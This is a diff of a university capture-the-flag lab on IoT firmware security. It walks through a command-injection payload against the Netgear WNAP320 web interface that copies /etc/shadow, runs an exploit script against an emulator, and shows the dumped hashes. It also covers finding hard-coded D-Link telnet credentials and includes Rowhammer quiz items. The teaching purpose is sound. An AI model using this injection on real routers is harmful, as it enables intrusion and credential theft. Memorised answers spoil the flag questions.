@@ -25,7 +25,7 @@ The device ships with a default username of `admin` and a password of `password`
 Let us start by using the docker container as follows
 
 ```bash
-sudo docker run -p 8000:8000 -it --rm uwacyber/cits1003-labs:iot 
+sudo docker run -p 8000:8000 -it --rm uwacyber/cits1003-labs:iot
 ```
 
 Change directory to `/opt/samples/WNAP320`
@@ -40,14 +40,14 @@ unzip WNAP320\ Firmware\ Version\ 2.0.3.zip
 
 ```bash
 Archive:  WNAP320 Firmware Version 2.0.3.zip
-inflating: ReleaseNotes_WNAP320_fw_2.0.3.HTML  
-inflating: WNAP320_V2.0.3_firmware.tar  
+inflating: ReleaseNotes_WNAP320_fw_2.0.3.HTML
+inflating: WNAP320_V2.0.3_firmware.tar
 ```
 
 The file `WNAPP320V2.0.3_firmware.tar` file is another archive file (colloquially called a tarball). We can extract this using the `tar` utility:
 
 ```bash
-tar -xvf WNAP320_V2.0.3_firmware.tar 
+tar -xvf WNAP320_V2.0.3_firmware.tar
 ```
 
 ```bash
@@ -131,8 +131,8 @@ It turns out that there is a vulnerability in a number of these files that allow
 One of the affected files is `boardDataWW.php` and the specific code at fault is:
 
 ```php
-if (!empty($_REQUEST['macAddress']) 
-    && array_search($_REQUEST['reginfo'],Array('WW'=>'0','NA'=>'1'))!==false 
+if (!empty($_REQUEST['macAddress'])
+    && array_search($_REQUEST['reginfo'],Array('WW'=>'0','NA'=>'1'))!==false
     && ereg("[0-9a-fA-F]{12,12}",$_REQUEST['macAddress'],$regs)!==false) {
     //echo "test ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'];
     //exec("wr_mfg_data ".$_REQUEST['macAddress']." ".$_REQUEST['reginfo'],$dummy,$res);
@@ -143,96 +143,94 @@ This code file is responsible for showing this page to capture a MAC address for
 
 ![Screen handled by boardDataWW.php](../.gitbook/assets/screen-shot-2021-07-09-at-2.26.16-pm.png)
 
-When the user enters a MAC address and clicks the submit button, the code above checks that it has been sent a valid MAC address (12 characters, alphanumeric) and a region code, and then it passes that to a command line utility called `wr_mfg_data`. If the MAC address was `f8ffc201fae5` and region code was 1, the command that would be executed would be:
+When the user enters a MAC address and clicks the Submit button, the value entered into the form is passed to a PHP script on the router. This script performs a small number of checks and then passes the input directly to a command line utility called `wr_mfg_data`.
+
+For example, if the user enters the MAC address `f8ffc201fae5` and selects region code `1`, the intended command executed on the system is:
 
 ```bash
 wr_mfg_data -m f8ffc201fae5 -c 1
 ```
 
-You will notice that there is no validation of the input to this command by the code. It just checks that the first 12 characters of the MAC address are alphanumeric. This means we can add data to the end of a valid MAC address and it will accept it. So if we add a second command to the address, it will be executed as well. To do that, we use the command separator `;` as follows:
+Looking at the PHP code, the validation of the MAC address is very weak. The script checks that the value is not empty and that it contains a sequence of 12 hexadecimal characters. However, it does not ensure that the input contains only those 12 characters. Any extra characters added after a valid MAC address are not removed or blocked.
+
+This means that as long as the input includes a valid 12-character MAC address somewhere, the check will pass, even if additional text is appended. Because the input is placed directly into a shell command, we can take advantage of this by adding a semicolon `;`. In a shell, the semicolon is used to separate commands, so anything after it is executed as a new command.
+
+For example, if the user enters the following value into the MAC address field:
 
 ```bash
-wr_mfg_data -m f8ffc201fae5;cp /etc/passwd test.html; -c 1
+f8ffc201fae5; cp /etc/shadow test.html;
 ```
 
-To achieve this we would put `f8ffc201fae5;cp /etc/passwd test.html;` into the text box for the MAC address. The second command copies the password file to an HTML file test.html that we can then access from the website. However, for this to work, we need to bypass a JavaScript validation check in the browser of the MAC address but that is trivial to do, which we will do below.
+The application inserts this value directly into the command string. The actual command executed by the system becomes:
+
+```bash
+wr_mfg_data -m f8ffc201fae5; cp /etc/shadow test.html; -c 1
+```
+
+As a result, the second command copies the `/etc/shadow` file into an HTML file named `test.html`, which can then be accessed through the router web interface. The `/etc/shadow` file contains password hashes for user accounts on Linux systems and is normally readable only by the root user. Being able to read this file through a web interface demonstrates the seriousness of this vulnerability.
 
 ### Testing the Vulnerability
 
-Instead of going out and buying a wireless router to test this on, we can run the firmware in an emulator. For this purpose, I have set up an emulation of this firmware so you can access the router page from your browser. You need to follow the steps below.
+Instead of purchasing a physical wireless router for testing, we can run the router firmware inside an emulator. For this lab, an emulated version of the firmware has been prepared so that you can access the router web interface directly from your browser. Follow the steps below carefully.
 
-First, launch the emulator container:
+First, open a new terminal and start the firmware emulator container using the following command:
 
 ```bash
-sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --name firmware-emulator-container -d --rm -p 80:80 uwacyber/cits1003-labs:wnap320-emulator
+sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --name wnap320-emulator-container --rm -p 80:80 uwacyber/cits1003-labs:wnap320-emulator
 ```
 
-This will start the container in the background. We use `--name firmware-emulator-container` to assign a name to this container so it can be easily killed later when no longer required.
+You may notice some command options that you have not seen before. The options `--cap-add=NET_ADMIN` and `--device=/dev/net/tun` grant the container additional permissions that are required for network emulation. The `--name wnap320-emulator-container` option assigns a name to the container to make later operations easier.
 
-`--cap-add=NET_ADMIN --device=/dev/net/tun` gives the container access to `/dev/net/tun`, which is required by QEMU. I could not find a workaround to run the container without the permission.
+After waiting a short time, try accessing the emulator by visiting [http://localhost/boardDataWW.php](http://localhost/boardDataWW.php) in your browser. If you see a "bad gateway" error, wait a little longer and then reload the page, as the emulator may still be initializing.
 
-After that, the emulator should be working at `http://localhost:80`. You may want to access the address with your browser to ensure the emulator is completely up and running before continuing. If you see "bad gateway" error, just wait, it is likely that the emulator is starting.
+At this point, you might notice that the web interface appears to prevent you from entering the exploit string we discussed eariler. This is because the page includes a JavaScript function named `checkMAC` that validates the input format before it is submitted. However, this is a **client-side check**; it only runs in your browser and does not protect the server-side PHP code. An attacker can bypass this entirely by sending requests directly to the router, skipping the browser and its JavaScript restrictions.
 
-Then, launch the lab container (if it has already been launched, you do not need to repeat):
+To demonstrate this bypass, we will use a Python script to send a crafted request directly to the router firmware. At this point, you should have two Docker containers running in parallel:
+
+- **The Attacker (`uwacyber/cits1003-labs:iot`):** The container you launched at the start of the lab.
+- **The Target (`uwacyber/cits1003-labs:wnap320-emulator`):** The emulator you just launched.
+
+The exploit script is located inside the `uwacyber/cits1003-labs:iot` container. To allow the attacker to communicate with the target, you must first determine the emulator's IP address. Open a new terminal and run:
 
 ```bash
-sudo docker run -p 8000:8000 -it --rm uwacyber/cits1003-labs:iot
+sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' wnap320-emulator-container
 ```
 
-As the emulator is running at `http://localhost:80`, to access the emulator from this lab container, we need to use the same technique as described in [lab 4](https://uwacyber.gitbook.io/cits1003/cits1003-labs/lab-4-computer-networking):
-
-Run this on your computer (not in the lab container):
+Note down the IP address displayed (e.g., `172.17.0.3`). Now, return to the terminal where your `uwacyber/cits1003-labs:iot` container is running and execute the following:
 
 ```bash
-ip addr
-```
-
-Look for something named like `docker0`. Usually, the IP address for the emulator container will be `172.17.0.1`.
-
-Then, do this in your lab container:
-
-```bash
-cd /opt/samples/WNAP320
-python3 ./exploit.py 172.17.0.1 /etc/passwd
+# If your IP address is different, replace it with the one you obtained above
+python3 /opt/samples/WNAP320/exploit.py 172.17.0.3 /etc/shadow
 ```
 
 ```bash
-root:x:0:0:root:/root:/bin/sh
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:100:sync:/bin:/bin/sync
-mail:x:8:8:mail:/var/spool/mail:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-operator:x:37:37:Operator:/var:/bin/sh
-haldaemon:x:68:68:hald:/:/bin/sh
-dbus:x:81:81:dbus:/var/run/dbus:/bin/sh
-nobody:x:99:99:nobody:/home:/bin/sh
-sshd:x:103:99:Operator:/var:/bin/sh
-admin:x:0:0:Default non-root user:/home/cli/menu:/usr/sbin/cli
+root:$1$qFRaTV7q$9Ywdjs5mpj6WK0SHCEp3k/:10933:0:99999:7:::
+bin:*:10933:0:99999:7:::
+daemon:*:10933:0:99999:7:::
+adm:*:10933:0:99999:7:::
+lp:*:10933:0:99999:7:::
+sync:*:10933:0:99999:7:::
+shutdown:*:10933:0:99999:7:::
+halt:*:10933:0:99999:7:::
+uucp:*:10933:0:99999:7:::
+operator:*:10933:0:99999:7:::
+nobody:*:10933:0:99999:7:::
+admin:$1$FEwmvgVS$VOTDB1sHpWGBXklzKrPHd1:10933:0:99999:7:::
 ```
 
-The exploit code also copies the content of the `/etc/passwd` into the `test.html` page - so if you go to the `http://[emulator address]/test.html`, you should be able to see the content of `/etc/passwd` (note that, you couldn't do this via the web interface because it got blocked by the Javascript!).
+The exploit script sends a crafted network request directly to the router firmware. Because the request does not pass through the browser, none of the JavaScript input checks are applied, and the firmware processes the request exactly as described earlier. If you now visit [http://localhost/test.html](http://localhost/test.html) in your browser, you should be able to view the contents of `/etc/shadow`, confirming that the exploit was successful.
 
-After you have done experimenting, remove the firmware emulator container running in the background with:
+If you are interested, you may examine the Python script `exploit.py` to see how the request is constructed and sent. The script takes two arguments: the IP address of the emulated router and the path of the file to read from the system. While the same technique could be used to perform more serious attacks, this is outside the scope of this unit.
 
-```bash
-sudo docker kill firmware-emulator-container
-```
+Once you have finished experimenting, terminate the firmware emulator by closing its terminal window, as it does not respond to keyboard inputs.
 
-If you are interested, you can look at the code in the Python script `exploit.py`. It takes two arguments, the address of the emulation and the file on the router you want to look at. Of course, the script could be changed to insert a backdoor into the router and then gain access to the network that the router is connected to (but it is outside the scope of this unit).
+### Question 1. Exploit to find the flag
 
-If you would like to set up the emulation yourself and test it, I have included the instructions in the [Setup Your Emulation on Google Cloud](lab-9-iot-ci-and-cps.md#undefined) section.
-
-### Question 1. Exploit to find the flag 
-
-Flag: Run `exploit.py` and pass the argument `flag.txt` 
+Flag: Run `exploit.py` and pass the argument `flag.txt`
 
 ## 2. Searching for Hard Coded Credentials
 
-In this example, we are looking at firmware for the DLINK 300 wireless access point. Change directory into `/opt/samples/DIR300`. Extract the firmware file with `binwalk` (Before the extraction, remember to use the `docker cp` command to copy the firmware file from the docker container into your Linux VM). 
+In this example, we are looking at firmware for the DLINK 300 wireless access point. Change directory into `/opt/samples/DIR300`. Extract the firmware file with `binwalk` (Before the extraction, remember to use the `docker cp` command to copy the firmware file from the docker container into your Linux VM).
 
 ```bash
 cd /opt/samples/DIR300
@@ -313,7 +311,7 @@ On PowerShell, the path may not show in the console. You can copy the text and p
 
 The file that is interesting is the script `telnetd.sh` where there is a login command with a `-u` flag that passes in a username (e.g., `Alphanetworks`) and password. Here, the password is passed in as a variable `image_sign`. So now let's inspect the `telnetd.sh` to see if we can find any information about `image_sign`. Keep tracking the leads and you should be able to find the password.
 
-The dir300 is the model number and the other parts of the password don't change much between models. Others have compiled a list of possible passwords for DLINK routers ([https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink\_telnet\_backdoor\_userpass.txt)).
+The dir300 is the model number and the other parts of the password don't change much between models. Others have compiled a list of possible passwords for DLINK routers ([https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink_telnet_backdoor_userpass.txt](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/dlink_telnet_backdoor_userpass.txt)).
 
 ### **Question 2. Enter the password**
 
@@ -328,7 +326,6 @@ First proposed in 2014, Rowhammer is a way to induce memory errors in modern DRA
 Read through the following article and answer the questions below:
 [https://news.sophos.com/en-us/2021/04/19/serious-security-rowhammer-is-back-but-now-its-called-smash/](https://news.sophos.com/en-us/2021/04/19/serious-security-rowhammer-is-back-but-now-its-called-smash/)
 
-
 ### Question 3. The Root Cause of Rowhammer
 
 What is the root cause of unexpected bit flips in Rowhammer?&#x20;
@@ -337,7 +334,6 @@ What is the root cause of unexpected bit flips in Rowhammer?&#x20;
 2. Memory access sequences &#x20;
 3. DRAM refresh cycle &#x20;
 4. Repeated nanoscopic electrical activity
-
 
 {% hint style="info" %}
 Submit the correct option as your flag (e.g., CITS1003{1} if option 1 is the correct answer).
@@ -367,123 +363,4 @@ Which of the following is an effective mitigation for SMASH on a Linux system? &
 
 {% hint style="info" %}
 Submit the correct option as your flag (e.g., CITS1003{1} if option 1 is the correct answer).
-{% endhint %}
-
-## \[Optional] Setup Your Emulation on Google Cloud (\~45 mins)
-
-Running the firmware emulation is much easier on Linux systems, but most of you would have either a Windows or Mac machine. So instead, we will use the cloud, in particular Google Cloud, to setup the emulation.
-
-#### Create Google Cloud account
-
-If you haven't done already, create a google cloud account. For the newly joined accounts, Google (as far as I remember) provides free credit which is more than enough for you to do this. Once your account is created, create a project. You may find the tutorial provided by Google useful here.
-
-#### Creating a VM
-
-Emulation VM is a bit different to other VMs, as it requires nested virtualization enabled. By default, the project enables the nested virtualization, but not the VM which we have to do manually. Follow these steps to achieve this:
-
-1. Navigation menu -> compute engine -> disks -> create disk
-2. give the disk a name. e.g., `ubuntu1804`
-3. select region and zone, that supports Haswell or later processors (which is the majority). For example, I just selected US central, but Syndey would also work.
-4. Select the source image of ubuntu-1804-\[latest variant].
-5. set the disk size - 20GB is sufficient for this emulation.
-6. Create.
-
-Now, to enable the VMX (nested virtualization), open the cloud console (activate cloud shell at the top right side). Then, type in:
-
-```
-$ gcloud compute images create [IMAGE NAME] --source-disk-zone [DISK ZONE] --source-disk [DISK NAME] \
-  --licenses "https://www.googleapis.com/compute/v1/projects/vm-options/global/licenses/enable-vmx"
-```
-
-The image name is set by you (e.g., `iot-emulation-image`). Other items should be filled in from the previous steps. Once done, now we can create the VM instance:
-
-1. compute engine -> create instance.
-2. enter the name e.g., `iot-emulator`.
-3. configure the hardware specs. For this emulation, `E2 small` is sufficient.
-4. select the boot disk to be the image created above.
-5. allow http traffic.
-
-Now the VM is ready, we need to setup emulator inside the VM. Inside the `VM instances` tab, your newly created instance should be running. Click the `ssh` button under the `connect` column. This should bring up a separate browser with the shell.
-
-We need the root privilege to configure networking, so we will work as root. We do this by running:
-
-```bash
-sudo passwd root
-[enter your root password]
-su
-```
-
-Now you should be working as root. Next, we install _Firmware Analysis Toolkit (FAT)_, which automates much of the _Firmadyne_ processes (the firmware emulator). Install by running these commands:
-
-```bash
-git clone https://github.com/attify/firmware-analysis-toolkit
-cd firmware-analysis-toolkit
-apt-get install -y libjpeg-dev zlib1g-dev nginx
-./setup.sh
-```
-
-Next, we have to enable the web service for us to access it via the browser. Do this by installing nginx and running it.
-
-```bash
-ufw enable
-ufw allow http
-```
-
-Now, open in the editor `/etc/nginx/sites-enabled/default`.
-
-Replace the existing location block with the following:
-
-```
-location / {
-	proxy_pass [address of the emulation];
-}
-```
-
-For example, our NetGear WNAP320 firmware with address `192.168.0.100`, it would be:
-
-```
-location / {
-	proxy_pass http://192.168.0.100;
-}
-```
-
-Now, restart nginx and check it is running
-
-```bash
-service nginx restart
-service nginx status
-```
-
-The output should look like this:
-
-```bash
-/etc/nginx$ service nginx status
-● nginx.service - A high performance web server and a reverse proxy server
-   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: enabled)
-   Active: active (running) since Thu 2022-02-17 06:40:52 UTC; 15s ago
-     Docs: man:nginx(8)
-  Process: 1266 ExecStart=/usr/sbin/nginx -g daemon on; master_process on; (code=exited, status=0/SUCCESS)
-  Process: 1083 ExecStartPre=/usr/sbin/nginx -t -q -g daemon on; master_process on; (code=exited, status=0/SUCCESS)
- Main PID: 1283 (nginx)
-    Tasks: 3 (limit: 1116)
-   CGroup: /system.slice/nginx.service
-           ├─1283 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
-           ├─1284 nginx: worker process
-           └─1285 nginx: worker process
-Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.
-```
-
-We are now ready to emulate!
-
-1. load the firmware into the VM (e.g., `wget http://www.downloads.netgear.com/files/GDC/WNAP320/WNAP320%20Firmware%20Version%202.0.3.zip)`
-2. unzip, and extract the tar file (e.g., `tar -xvf your_tar_file.tar`).
-3. copy the `rootfs.squashfs` into the `firmware analysis toolkit` folder.
-4. start emulation e.g., `./fat.py rootfs.squashfs`
-
-Once the emulation is running, you can access by going to the external address of your VM. You can locate your `external IP address` of your VM in the `VM instances` tab. Press the link, and you should be able to access the router interface that you just have setup.
-
-{% hint style="danger" %}
-Once you finish playing with your emulator, make sure the **STOP** your VM - otherwise you will continue to lose your Google Cloud credit, and once it runs out you have to pay!
-
-Also, storing disks on Google Cloud gets charged (although very small), so if you won't be using it later, delete all disks and images as well.
 {% endhint %}
